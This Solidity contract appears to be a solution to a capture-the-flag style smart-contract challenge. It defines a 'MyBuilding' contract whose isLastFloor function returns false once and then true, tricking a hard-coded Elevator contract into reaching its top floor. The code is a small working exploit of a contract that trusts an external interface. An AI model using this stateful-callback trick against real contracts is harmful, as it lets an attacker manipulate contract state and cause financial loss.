// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract MyBuilding{


    bool public toggle;
    uint256 count=0;
    Elevator e1= Elevator(0x956647b6dc5E52ee4C212f8A1a87aabcCCed1FAB);


    function goTotheElevator(uint256 _floor) public {
        e1.goTo(_floor);
    }

    function isLastFloor(uint _floor) public returns(bool){
        
        if(count==0){
            count++;
            return false;
        }
        return true;
    }

}